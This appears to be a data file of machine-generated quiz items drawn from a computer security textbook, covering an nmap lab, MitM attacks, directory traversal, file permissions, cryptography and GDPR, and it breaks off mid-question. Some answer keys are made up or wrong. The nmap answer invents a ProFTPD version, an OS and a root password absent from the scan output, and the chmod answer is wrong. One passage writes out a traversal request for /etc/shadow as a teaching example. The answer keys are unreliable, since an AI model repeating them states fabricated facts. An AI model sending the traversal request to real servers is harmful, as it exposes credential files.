=&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding how to use the `nmap` command to perform various types of scans, including service version detection and OS fingerprinting.", "question": "Considering the provided context, specifically the `nmap` scans performed on the `victim` machine, detail three distinct pieces of information revealed by the `-A` option, and explain the potential security implications of each.", "answer": "1. ProFTPD version 2.7: This reveals a potential vulnerability that could be exploited. 2. Debian-based OS: This allows for targeted attacks based on known vulnerabilities in that OS version. 3. Root password: This provides direct access to the system, bypassing authentication.", "explanation": "The `-A` option reveals several key pieces of information. First, it identified the running service as ProFTPD, specifically version 2.7.  This is important because older versions of ProFTPD have known vulnerabilities. Second, it provided an OS fingerprint, indicating a Debian-based system running a relatively recent version of its kernel.  Finally, it identified the root password as `rxt1077`.  Each of these findings represents a potential attack vector; the ProFTPD version could be exploited, the OS fingerprint could be used for targeted attacks, and the root password directly compromises system security.", "question_token_count": 45, "answer_correctness_score": 4, "explanation_validity_score": 3, "question_clarity_score": 6, "question_groundedness_score": 10, "avg_answer_token_count": 61, "choices": null}
{"context": "## 1.8. Review Questions {#_computer_systems_security_planning_for_success.xhtml_intro_review}\n::: description-list\n\n[In terms of information security, what does CIA stand for? What do each of the principles mean?]{.term}\n\n:   []{.principal}\n\n[Why is it important to have a security plan? What types of controls can a security plan make use of? Give an example of each.]{.term}\n\n:   []{.principal}\n\n[How do backups and encryped data compliment eachother? Explain.]{.term}\n\n:   []{.principal}\n\n:::\n\n::::\n\n:::::::::::::::::::::::\n\n::::::::::::::::::::::::::::::::::::::::::::::::::::::: {.section .sect1 title=\"2. Cryptography\"}\n\n\n# 2. Cryptography {#_computer_systems_security_planning_for_success.xhtml__cryptography}\nThis chapter is meant to serve as a brief and gentle introduction to the cryptographic concepts often encountered in the\n\nfield of security. It is by no means exhaustive but it should provide a basis for a better understanding of why\n\nprotocols are designed the way they are. Cryptography is a method of scrambling data into non-readable text. It allows\n\nus to transform data into a secure form so that unauthorized users cannot view it.\n\n:::: {.section .sect2 title=\"2.1. Why do we need cryptography?\"}\n", "topic": "Briefly outline the purpose of cryptography and how it transforms data into an unreadable format, facilitating secure data transmission and storage.", "question": "What is the primary function of cryptography, as described within the provided text, and how does this function contribute to secure data handling?", "answer": "Scrambling data into non-readable text.", "explanation": "The text explicitly states that cryptography \u201cis a method of scrambling data into non-readable text.\u201d", "question_token_count": 27, "answer_correctness_score": 7, "explanation_validity_score": 7, "question_clarity_score": 7, "question_groundedness_score": 10, "avg_answer_token_count": 9, "choices": null}
{"context": "## One-time Passwords\n::: content\n\nTo help mitigate replay attacks, an online banking application may require that client use a one-time password (OTP)\n\nwhen submitting transactions. An OTP is a frequently changing value that is known to both the client and the server.\n\nSeveral one-time password schemes exist, most of which make use of a cryptographic hash function with a shared seed\n\nbetween client and server. Periodically the client and server update to a new hash based on the seed and without the\n\nseed it is impossible to know what the next hash will be. By using an OTP anyone who intercepts the traffic will not be\n\nable to perform a replay attack as the password will not be current.\n\n:::\n\n</aside>\n\n::::\n\n::: {.section .sect3 title=\"5.1.4. SSL Circumvention\"}\n\n\n### 5.1.4. SSL Circumvention {#_computer_systems_security_planning_for_success.xhtml__ssl_circumvention}\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/ssl-mitm.svg\" width=\"500\" alt=\"ssl mitm\" />\n\n</div>\n\n<figcaption>MitM preventing HTTPS upgrade and skimming passwords</figcaption>\n\n</figure>\n\nIf you think about the intercepted key exchange given in the above MitM example, a similar attack can allow attackers to\n\nview SSL traffic. The attacker gives the victim a bogus certificate authority (CA) certificate which the victim\n\ninstalls. This is often accomplished via a trojan. Then the attacker places themselves in the middle of an uninitiated\n\nsecure connection. During the key exchange the attacker creates a custom certificate signed by a bogus CA for the\n\nconnection between attacker and victim. The attacker also makes an actual HTTPS connection to the service and proxies\n\ndata for the victim. All of the victims data will show up in plaintext for the attacker but the connection will appear\n\nto be secure for the victim. This is used in the [Fiddler](https://www.telerik.com/fiddler){.link} debugging proxy to\n\ndecrypt HTTPS traffic and is also used in some network appliances that perform deep packet inspection.\n\nAnother MitM attack on SSL is simply to maintain or downgrade to an HTTP connection with the victim and proxy data to an\n\nactual HTTPS connection with the server. Most servers will upgrade an insecure connection, but by intercepting that\n\nexchange the attacker can continue to monitor the victim's traffic.\n\n:::\n\n::::::::\n\n::::::: {.section .sect2 title=\"5.2. Network Layer Attacks\"}\n", "topic": "The role of a cryptographic hash function and shared seed in the operation of an OTP scheme.", "question": "How does the shared seed contribute to the security of a one-time password scheme, and what consequence results from its absence?", "answer": "The shared seed allows for periodic hash updates, rendering previously generated OTPs invalid and preventing replay attacks; its absence compromises OTP security.", "explanation": "The shared seed is crucial because it enables periodic updates to the cryptographic hash, ensuring that previously valid OTPs become obsolete. Without the seed, the hash function\u2019s output is predictable, rendering OTPs vulnerable to replay attacks.", "question_token_count": 25, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 28, "choices": null}
{"context": "### 9.1.3. OWASP {#_computer_systems_security_planning_for_success.xhtml__owasp}\nThe Open Web Application Security Project (OWASP) is an international non-profit organization focused on web application\n\nsecurity. They have an active online community with tools, forums, videos, and news posts. Their most popular resource\n\nis the [OWASP Top 10](https://owasp.org/Top10){.link}, an annual listing of the most popular web application\n\nvulnerabilities.\n\n:::\n\n:::::::\n\n::: {.section .sect2 title=\"9.2. SOC\"}\n\n\n## 9.2. SOC {#_computer_systems_security_planning_for_success.xhtml__soc}\nA security operations center (SOC) is a dedicated team of security experts working within the business they are\n\nprotecting. Incident response and recovery is the job of the SOC. SOCs also set up preventative infrastructure, monitor\n\nthe environment, respond to possible threats, manage logs, and maintain compliance.\n\nAn important concept in the SOC is the idea of a *baseline*. A popular company may be attacked hundreds of times over\n\nthe course of a day. It is important that the SOC knows what the average volume of attack is so they can maintain\n\nresources to respond. Through monitoring an SOC can establish a baseline of what is normal in the environment.\n\n:::\n\n::::: {.section .sect2 title=\"9.3. Incidents\"}\n", "topic": "How does the concept of a \u201cbaseline\u201d relate to the operational goals of a Security Operations Center (SOC)?", "question": "How does the establishment of a \u201cbaseline\u201d within a Security Operations Center (SOC) directly contribute to its operational efficiency and effectiveness?", "answer": "It allows the SOC to effectively manage resources and respond to incidents.", "explanation": "The baseline represents a critical metric for the SOC, enabling it to distinguish between routine activity and potential security threats.", "question_token_count": 27, "answer_correctness_score": 8, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 14, "choices": null}
{"context": "### 5.5.8. Directory Traversal {#_computer_systems_security_planning_for_success.xhtml__directory_traversal}\nA poorly designed web server may be subject to a directory traversal attack. Recall that web servers are designed to\n\nserve static content from a particular directory, `/var/www`{.literal} for example. Now suppose that an attacker\n\nsubmitted a `GET`{.literal} request for\n\n[`http://www.example.com/../../etc/shadow`{.literal}](http://www.example.com/../../etc/shadow){.link}. It is possible\n\nthat the web server may actually go up two directories and serve that file.\n\nThis can be addressed with file permissions, access controls, and filtering incoming requests. It is important to note\n\nthat there is more than one way to specify a path in an HTTP request, including using URL encoding, so all possible\n\nmalicious inputs must be sanitized.\n\n:::\n\n::: {.section .sect3 title=\"5.5.9. URL Hijacking/Typosquating\"}\n\n\n### 5.5.9. URL Hijacking/Typosquating {#_computer_systems_security_planning_for_success.xhtml__url_hijackingtyposquating}\nAn unfortunately common, broad-based attack is to buy a domain with a similar name to a very popular domain. When users\n\nmistype the popular domain they end up at the malicious actor's website. For example, imagine if someone registered\n\n`gooogle.com`{.literal} (note the three o's). They could gain a lot of traffic from people who mistyped google.\n\nThese sites could be used for ad revenue, phishing credentials, or even possibly to distribute malware. A mitigation\n\nthat several browsers implement is to keep a list of malicious websites and warn users before they visit them.\n\n:::\n\n::: {.section .sect3 title=\"5.5.10. Domain Hijacking\"}\n", "topic": "Explain the importance of sanitizing all incoming requests to prevent directory traversal attacks, considering the various methods of specifying paths in HTTP requests.", "question": "Why is it essential to sanitize all incoming HTTP requests, specifically considering the diverse methods used to specify paths, in order to prevent directory traversal vulnerabilities?", "answer": "To prevent unauthorized file access.", "explanation": "Sanitization prevents the web server from interpreting malicious path manipulations, such as relative path traversal sequences, and accessing unauthorized files.", "question_token_count": 30, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 7, "choices": null}
{"context": "### 10.2.3. Hybrid {#_computer_systems_security_planning_for_success.xhtml__hybrid}\nHybrid cloud uses both models, public and private, and hosts some things on public IaaS services and other on internal,\n\nprivate IaaS services. This can be the best of both worlds, assuming the applications being supported leverage the full\n\nadvantages of their environment.\n\n:::\n\n::: {.section .sect3 title=\"10.2.4. Multi-Cloud\"}\n\n\n### 10.2.4. Multi-Cloud {#_computer_systems_security_planning_for_success.xhtml__multi_cloud}\nMulti-cloud typically refers to utilizing more than one cloud provider. This may be required for applications that wish\n\nto remain available even if their cloud provider fails. Multi-cloud also avoids the issue of vendor lock-in, where the\n\napplication is only set up to run on one provider.\n\nFrom a security standpoint, multi-cloud likely increases the attack surface of an application. You now have to be\n\nconcerned with the vulnerabilities of two providers instead of just one. This must be weighed against the benefits of\n\nredundancy when deciding whether or not to utilize more than one cloud provider.\n\n:::\n\n:::::::\n\n::: {.section .sect2 title=\"10.3. Serverless Solutions\"}\n", "topic": "Explain the trade-offs between leveraging the redundancy offered by multi-cloud and the increased security complexity it introduces.", "question": "Considering the security implications, what fundamental trade-off arises when an organization strategically adopts a multi-cloud architecture compared to a single-cloud environment?", "answer": "Increased attack surface versus redundancy and vendor lock-in avoidance.", "explanation": "The text explicitly states that multi-cloud increases the attack surface, necessitating consideration of vulnerabilities across multiple providers, while simultaneously offering redundancy and avoiding vendor lock-in.", "question_token_count": 27, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 12, "choices": null}
{"context": "### 7.3.4. Identity and Access Management (IAM) {#_computer_systems_security_planning_for_success.xhtml__identity_and_access_management_iam}\nIdentity and Access Management is a framework for managing digital identities. IAM manages the user database, logs when\n\nusers sign in and out, manages the creation of groups or roles, and allows for the assignment and removal of access\n\nprivileges. Many different groups offer IAM frameworks, the most famous of which may be Amazon Web Systems (AWS) which\n\nuse it for controlling access to the infrastructure as a service (IaaS) technologies they offer.\n\nIAM often makes use of PIM and PAM to accomplish these goals. A well-implemented, thorough IAM framework can work across\n\noperating systems and handle many different types of resources.\n\n:::\n\n::: {.section .sect3 title=\"7.3.5. Unix File Permissions\"}\n\n\n### 7.3.5. Unix File Permissions {#_computer_systems_security_planning_for_success.xhtml__unix_file_permissions}\nFrom its inception, Unix was designed to be a multi-user environment, and as such, a lot of attention was paid to file\n\npermissions. Every file in a Unix system has an owner and a group. Each file also has permissions for owner, group, and\n\nall users. Permissions are set using octal numbers where each bit represents read (bit 0: 1), write (bit 1: 2), or\n\nexecute (bit 2: 4) permission.\n\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/permissions.svg\" alt=\"permissions\" />\n\n</div>\n\n</figure>\n\nFor example, if you wanted a read and execute permission the number would be 5 (1 + 4). Read and write permission would\n\nbe 3 (1 + 2).\n\nPermissions are specified with the `chmod`{.literal} command, the first octal number is the permissions for the owner,\n\nthe second is for the group, and the third is for all user. So to change a file to have read, write, and execute\n\npermissions for the owner, read permissions for the group, and no permissions for everyone else, the command would be\n\n`chmod 710 <filename>`{.literal} where `<filename>`{.literal} is the name of your file.\n\nThe owner and group of a file can be set with the `chown`{.literal} command:\n\n`chown <owner>.<group> <filename>`{.literal}. If `<group>`{.literal} is not specified only the owner is changed.\n\n:::\n\n::: {.section .sect3 title=\"7.3.6. ACLs\"}\n", "topic": "The functionality and usage of the `chmod` command for modifying file permissions in a Unix environment.", "question": "A file currently has permissions of 640 (owner: read/write, group: read, others: none).  If the owner of the file changes the permissions to 750 (owner: read/write/execute, group: read, others: none), what is the effective change in the file\u2019s accessibility to other users?", "answer": "Group read access is removed.", "explanation": "The original permissions granted read access to the group. Changing to 750 removes group read access, effectively restricting access to only the owner and the group's members who have execute permissions (which is not explicitly stated and therefore not relevant to the question).", "question_token_count": 66, "answer_correctness_score": 1, "explanation_validity_score": 1, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 7, "choices": null}
{"context": "## 2.6. Symmetric Encryption {#_computer_systems_security_planning_for_success.xhtml__symmetric_encryption}\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/symmetric.svg\" width=\"550\" alt=\"symmetric\" />\n\n</div>\n\n</figure>\n\nSymmetric encryption is probably the simplest encryption to understand in that it only uses a single key (in this case\n\nour key is labelled \\'A\\') to encrypt or decrypt data. Both parties need to know the private key in order to\n\ncommunicate. It does pose a security risk in that if the channel used for key exchange is insecure, all of the messages\n\ncan be decrypted. That being said, given that it is simpler than many other forms of encryption, it is often used for\n\nsecure communication or storage.\n\n::::: example\n\n::: example-title\n\nOne-time-pad\n\n:::\n\n::: example-content\n\nOne-time-pad (OTP) is a rare example of a pen and paper, symmetric encryption scheme that cannot be cracked. The\n\ndifficulty in OTP mirrors the difficulty with all symmetric encryption, namely that pre-shared keys need to be exchanged\n\nat some point.\n\nImagine that a prisoner wishes to send encrypted messages to someone outside the prison. To do so, they will make use of\n\na copy of Harry Potter and the Sorcerer's Stone that they have in their cell. The message they want to send is \\\"DIG UP\n\nTHE GOLD\\\". They turn to \\\"Chapter One: The Boy Who Lived\\\" and look up the first twelve letters in the chapter: MR AND\n\nMRS DURS. For each letter of their message, they convert it to its number in the alphabet: 4 9 7 21 16 20 8 5 7 15 12 4\n\n(DIG UP THE GOLD). They do the same for the key they looked up in their book: 13 18 1 14 4 13 18 19 4 21 18 19 (MR AND\n\nMRS DURS). Finally they add the two numbers to get their ciphertext: 17 27 8 35 20 33 26 24 11 36 30 23.\n\nIf the prisoner sends that ciphertext to someone on the outside who knows that they key is the first chapter of Harry\n\nPotter and the Sorcerer's Stone, they will be able to subtract the key from each of the numbers in the ciphertext and\n\ndiscover the plaintext message. While theoretically unbreakable, anybody else who has the key can recover the text as\n\nwell. This means that using common keys like popular books make it trivial for a man-in-the-middle to decode the\n\nciphertext. After all, the warden probably knows every book that the prisoner has in their cell.\n\nOTP has been used by spy agencies, often for communications between individuals via dead-drops. In this situation tables\n\nof random characters printed in duplicate are exchanged as the key.\n\n:::\n\n:::::\n\n::::::\n\n::: {.section .sect2 title=\"2.7. Asymmetric Encryption\"}\n", "topic": "The theoretical properties and practical limitations of the One-Time-Pad (OTP) encryption scheme, including its susceptibility to compromise with common keys.", "question": "Considering the practical implementation of the One-Time-Pad (OTP) described in the text, what specific vulnerability arises when a shared key is derived from a commonly accessible source, such as a book chapter, and why does this compromise its security?", "answer": "Utilizing a commonly accessible key source compromises OTP security due to the introduction of predictability and potential interception by an attacker.", "explanation": "The vulnerability stems from the OTP's reliance on a truly random and unique key for each message. Utilizing a predictable source like a book chapter introduces the possibility of an attacker intercepting and analyzing the key, subsequently decrypting all messages transmitted using that key.", "question_token_count": 49, "answer_correctness_score": 9, "explanation_validity_score": 8, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 26, "choices": null}
{"context": "## Case Study: Equifax\n::: content\n\n[In September of 2017, Equifax announced a data breach the exposed the personal information of 147 million\n\npeople.](https://www.ftc.gov/enforcement/cases-proceedings/refunds/equifax-data-breach-settlement){.link} The original\n\nattack made use of an exploit in an outdated version of [Apache Struts](https://struts.apache.org/){.link} which was\n\nbeing used as part of Equifax's system for handling credit disputes from customers. Once the attackers had gained access\n\nto internal Equifax servers, the began gathering as much information as they could from internal databases.\n\nWhat is particularly egregious about this data breach is that passwords in many databases were stored in plaintext. This\n\nmeans that the attackers were able to try the passwords and usernames on other services. While it is important that\n\nusers use different passwords for different services it is far more disturbing that a company as large as Equifax did\n\nnot have the policies in place to use cryptography to mitigate the risks from such an enormous breach.\n\n:::\n\n</aside>\n\n::::\n\n::::::::: {.section .sect2 title=\"2.2. Terminology\"}\n", "topic": "How does the Equifax data breach case illustrate the importance of proactive vulnerability management in large organizations?", "question": "What fundamental security practice's absence directly contributed to the scale and impact of the Equifax data breach, beyond the initial vulnerability?", "answer": "Password encryption.", "explanation": "The text explicitly states that Equifax failed to implement cryptographic measures for password storage, enabling attackers to attempt logins to other services.", "question_token_count": 26, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 4, "choices": null}
{"context": "### 8.2.6. GDPR {#_computer_systems_security_planning_for_success.xhtml__gdpr}\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/gdpr.jpg\" width=\"300\" alt=\"gdpr\" />\n\n</div>\n\n<figcaption><a href=\"https://www.Convert.com/GDPR\" class=\"link\">Convert GDPR</a> is used under <a\n\nhref=\"https://creativecommons.org/licenses/by/2.0/\" class=\"link\">CC BY 2.0</a></figcaption>\n\n</figure>\n\nThe General Data Protection Regulation (GDPR) is a less targeted, but more far-reaching European Union law requiring\n\nthat customers be notified if they are being tracked. For most people, the biggest effect of the GDPR is that they have\n\nto sign off on cookies being used by web sites. Recall that cookies are used almost exclusively for session management\n\nand as such they track visitors to a website.\n\nThe GDPR outlines rules for risk assessment, encryption, pseudonym usage, documentation, and audits. The GDPR also gives\n\nvisitors the option to have their customer data forgotten by a website. Businesses wishing to operation in the European\n\ntheater, most world-wide businesses, must make themselves GDPR compliant.\n\n:::\n\n::: {.section .sect3 title=\"8.2.7. US Patriot Act/PRISM\"}\n", "topic": "Describe the core requirements of a risk assessment under the GDPR framework.", "question": "What specific components constitute the mandated risk assessment process within the GDPR framework, as outlined in the provided text?", "answer": "Risk assessment, encryption, pseudonym usage, documentation, and audits.", "explanation": "The text explicitly states that the GDPR outlines rules for risk assessment, encryption, pseudonym usage, documentation, and audits.", "question_token_count": 22, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 6, "question_groundedness_score": 8, "avg_answer_token_count": 15, "choices": null}
{"context": "# Instructional Notes {#_computer_systems_security_planning_for_success.xhtml__instructional_notes}\nThe text, labs, and review questions in this book are designed as an introduction to the applied topic of computer\n\nsecurity. With these resources students will learn ways of preventing, identifying, understanding, and recovering from\n\nattacks against computer systems. This text also presents the evolution of computer security, the main threats, attacks\n\nand mechanisms, applied computer operation and security protocols, main data transmission and storage protection\n\nmethods, cryptography, network systems availability, recovery, and business continuation procedures.\n\n:::: {.section .sect2 title=\"Learning Outcomes\"}\n\n\n## Learning Outcomes {#_computer_systems_security_planning_for_success.xhtml__learning_outcomes}\nThe chapters, labs, and review questions in this text are designed to align with the objectives [CompTIA Security+\n\nSY0-601](https://www.comptia.jp/pdf/CompTIA%20Security+%20SY0-601%20Exam%20Objectives%20(3.0).pdf){.link} exam. The\n\nobjectives are reproduced here for reference:\n\n::: itemized-list\n\n- [1.1 Compare and contrast different types of social engineering techniques.]{.principal}\n\n- [1.2 Given a scenario, analyze potential indicators to determine the type of attack.]{.principal}\n\n- [1.3 Given a scenario, analyze potential indicators associated with application attacks.]{.principal}\n\n- [1.4 Given a scenario, analyze potential indicators associated with network attacks.]{.principal}\n\n- [1.5 Explain different threat actors, vectors, and intelligence sources.]{.principal}\n\n- [1.6 Explain the security concerns associated with various types of vulnerabilities.]{.principal}\n\n- [1.7 Summarize the techniques used in security assessments.]{.principal}\n\n- [1.8 Explain the techniques used in penetration testing.]{.principal}\n\n- [2.1 Explain the importance of security concepts in an enterprise environment.]{.principal}\n\n- [2.2 Summarize virtualization and cloud computing concepts.]{.principal}\n\n- [2.3 Summarize secure application development, deployment, and automation concepts.]{.principal}\n\n- [2.4 Summarize authentication and authorization design concepts.]{.principal}\n\n- [2.5 Given a scenario, implement cybersecurity resilience.]{.principal}\n\n- [2.6 Explain the security implications of embedded and specialized systems.]{.principal}\n\n- [2.7 Explain the importance of physical security controls.]{.principal}\n\n- [2.8 Summarize the basics of cryptographic concepts.]{.principal}\n\n- [3.1 Given a scenario, implement secure protocols.]{.principal}\n\n- [3.2 Given a scenario, implement secure network architecture concepts.]{.principal}\n\n- [3.3 Given a scenario, implement secure network designs.]{.principal}\n\n- [3.4 Given a scenario, install and configure wireless security settings.]{.principal}\n\n- [3.5 Given a scenario, implement secure mobile solutions.]{.principal}\n\n- [3.6 Given a scenario, apply cybersecurity solutions to the cloud.]{.principal}\n\n- [3.7 Given a scenario, implement identity and account management controls.]{.principal}\n\n- [3.8 Given a scenario, implement authentication and authorization solutions.]{.principal}\n\n- [3.9 Given a scenario, implement public key infrastructure.]{.principal}\n\n- [4.1 Given a scenario, use the appropriate tool to assess organizational security.]{.principal}\n\n- [4.2 Summarize the importance of policies, processes, and procedures for incident response.]{.principal}\n\n- [4.3 Given an incident, utilize appropriate data sources to support an investigation.]{.principal}\n\n- [4.4 Given an incident, apply mitigation techniques or controls to secure an environment.]{.principal}\n\n- [4.5 Explain the key aspects of digital forensics.]{.principal}\n\n- [5.1 Compare and contrast various types of controls.]{.principal}\n\n- [5.2 Explain the importance of applicable regulations, standards, or frameworks that impact organizational security\n\n  posture.]{.principal}\n\n- [5.3 Explain the importance of policies to organizational security.]{.principal}\n\n- [5.4 Summarize risk management processes and concepts.]{.principal}\n\n- [5.5 Explain privacy and sensitive data concepts in relation to security.]{.principal}\n\n:::\n\n::::\n\n::::: {.section .sect2 title=\"Example Schedule\"}\n", "topic": "Summarize the basics of cryptographic concepts, as presented in the text.", "question": "Considering the text\u2019s emphasis on \u201cthe basics of cryptographic 